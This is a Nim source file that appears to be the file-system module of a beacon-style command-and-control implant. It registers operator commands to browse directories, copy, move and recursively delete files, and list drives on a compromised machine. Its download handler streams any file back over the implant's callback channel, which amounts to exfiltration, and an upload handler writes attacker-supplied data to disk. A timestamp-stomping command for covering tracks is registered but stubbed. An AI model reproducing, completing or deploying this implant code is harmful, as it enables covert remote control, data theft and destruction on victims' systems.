import std/[os, strutils, sequtils, times, streams, endians, tables]
import ../[utils, config]
import types, result
when defined(windows):
    import winim

var fileCounter: int32 = 0
var cancelTable = initTable[int32, bool]()

proc cd(buf: var seq[byte], cmd: command_type) = 
    try:
        setCurrentDir(buf.toString.replace("\\", "/"))
        dbg "[+] current dir: " & getCurrentDir()
    except OSError:
        dbg "[-] failed to change dir: " & buf.toString
    return

proc pwd(buf: var seq[byte], cmd: command_type) = 
    try:
        var dir = getCurrentDir()
        push_result(CALLBACK_PWD, dir.toSeq)
    except OSError:
        dbg "[-] failed to get current dir"
    return

proc mkdir(buf: var seq[byte], cmd: command_type) =
    var dir = buf.toString.replace("\\", "/")
    try:
        createDir(dir)
        dbg "[+] created dir: " & dir
    except OSError:
        dbg "[-] failed to create dir: " & dir
    return

proc cp(buf: var seq[byte], cmd: command_type) =
    var args = parse_multiple(buf, 2)
    var src = args[0].toString.replace("\\", "/")
    var dst = args[1].toString.replace("\\", "/")
    try:
        copyFile(src, dst)
        dbg "[+] copied file: " & src & " to " & dst
        push_result(CALLBACK_OUTPUT, "copy success".toSeq)
    except OSError:
        dbg "[-] failed to copy file: " & src & " to " & dst

proc mv(buf: var seq[byte], cmd: command_type) =
    var args = parse_multiple(buf, 2)
    var src = args[0].toString.replace("\\", "/")
    var dst = args[1].toString.replace("\\", "/")
    try:
        moveFile(src, dst)
        dbg "[+] moved file: " & src & " to " & dst
        push_result(CALLBACK_OUTPUT, "move success".toSeq)
    except OSError:
        dbg "[-] failed to move file: " & src & " to " & dst

proc rm(buf: var seq[byte], cmd: command_type) =
    var path = buf.toString.replace("\\", "/")
    try:
        if fileExists(path):
            removeFile(path)
            dbg "[+] removed file: " & path
            push_result(CALLBACK_OUTPUT, "remove success".toSeq)
        elif dirExists(path):
            removeDir(path)
            dbg "[+] removed dir: " & path
            push_result(CALLBACK_OUTPUT, "remove success".toSeq)
        else:
            push_result(CALLBACK_OUTPUT, "file or dir not found".toSeq)
    except OSError:
        dbg "[-] failed to remove file: " & path

proc ls(buf: var seq[byte], cmd: command_type) =
    var pending = parse_pending(buf)
    dbg "[+] pending: " & $pending
    var path = parse_once(buf).toString.replace("\\", "/")

    var total = ""
    for path in walkPattern(path).toSeq:
        var info: FileInfo
        try:
            info = getFileInfo(path)
        except OSError:
            dbg "[-] failed to get file info: " & path
            continue
        case info.kind
        of pcFile: total = total & "F"
        of pcDir: total = total & "D"
        else: total = total & "?"
        
        var p = splitPath(absolutePath(path))
        var timestr = info.lastWriteTime.format("dd/MM/yyyy HH:mm:ss")
        total = total & "\t" & $info.size & "\t" & timestr & "\t" & p.tail  & "\n"

    removeSuffix(path, "/*")
    var timestr = "00/00/0000 00:00:00"
    try:
        timestr = getFileInfo(path).lastWriteTime.format("dd/MM/yyyy HH:mm:ss")
    except OSError:
        dbg "[-] failed to get file info: " & path
    total = "D\t0\t" & timestr & "\t..\n" & total
    total = "D\t0\t" & timestr & "\t.\n" & total
    total = absolutePath(path).replace("/", "\\") & "\\*" & "\n" & total
    
    dbg "[+] total: " & total
    var res_bytes = total.toSeq
    put_pending(res_bytes, pending)
    push_result(CALLBACK_PENDING, res_bytes)

proc download(buf: var seq[byte], cmd: command_type) =
    var temp4: array[4, byte]

    var path = buf.toString.replace("\\", "/")
    var request_id = fileCounter
    fileCounter += 1
    var info = getFileInfo(path)
    var file_size = info.size.int32
    
    var file_reply: seq[byte]
    bigEndian32(addr temp4, addr request_id)
    file_reply.add(temp4)
    bigEndian32(addr temp4, addr file_size)
    file_reply.add(temp4)
    file_reply.add(path.toSeq)
    
    push_result(CALLBACK_FILE, file_reply)

    cancelTable[request_id] = false
    var strm = newFileStream(path, fmRead)
    
    var read_ok = false
    while not read_ok and not cancelTable[request_id]:
        # NOTICE: large download_size causes overflow? makes beacon exit unexpectly, larger stack may fix this
        var buffer: array[download_size, byte]
        var read = strm.readData(buffer.addr, download_size)
        dbg "[+] read: " & $read & ", buffer: " & repr(buffer)
        file_reply = buffer.toSeq[0..<read]
        if read < download_size: read_ok = true

        bigEndian32(addr temp4, addr request_id)
        file_reply.insert(temp4, 0)
        push_result(CALLBACK_FILE_WRITE, file_reply)
        sleep(wait_time)
    
    strm.close()
    bigEndian32(addr temp4, addr request_id)
    push_result(CALLBACK_FILE_CLOSE, temp4.toSeq)

proc cancel_download(buf: var seq[byte], cmd: command_type) =
    var request_id: int32
    bigEndian32(addr request_id, addr buf)
    cancelTable[request_id] = true

proc upload(buf: var seq[byte], cmd: command_type) =
    var path = parse_once(buf).toString.replace("\\", "/")
    var content: array[download_size, byte]
    var strm = newFileStream(path, fmAppend)
    var writelen = 0
    while buf.len > 0:
        if buf.len < download_size: writelen = buf.len
        else: writelen = download_size
        for i in 0..<writelen: content[i] = buf[i]
        strm.writeData(content.addr, writelen)
        buf = buf[writelen..<buf.len]
    strm.close()

proc list_drives(buf: var seq[byte], cmd: command_type) =
    when not defined(windows):
        push_result(CALLBACK_OUTPUT, "only suppported on windows".toSeq)
        return
    var drives = repr(GetLogicalDrives().uint32).toSeq
    buf = buf[0..<4]
    buf.add(drives)
    push_result(CALLBACK_PENDING, buf)    

proc time_stomp(buf: var seq[byte], cmd: command_type) =
    when not defined(windows):
        push_result(CALLBACK_OUTPUT, "only suppported on windows".toSeq)
        return
    # todo
    var args = parse_multiple(buf, 2)
    var to = args[0].toString
    var fr = args[1].toString
    dbg "[+] to: " & to & ", from: " & fr

register_command(CMD_TYPE_CD, cd)
register_command(CMD_TYPE_PWD, pwd)
register_command(CMD_TYPE_MAKEDIR, mkdir)
register_command(CMD_TYPE_FILE_COPY, cp)
register_command(CMD_TYPE_FILE_MOVE, mv)
register_command(CMD_TYPE_REMOVE, rm)
register_command(CMD_TYPE_FILE_BROWSE, ls)
register_command(CMD_TYPE_DOWNLOAD, download)
register_command(CMD_TYPE_CANCEL, cancel_download)
register_command(CMD_TYPE_UPLOAD_START, upload)
register_command(CMD_TYPE_UPLOAD_LOOP, upload)
register_command(CMD_TYPE_DRIVES, list_drives)
register_command(CMD_TYPE_TIMESTOMP, time_stomp)
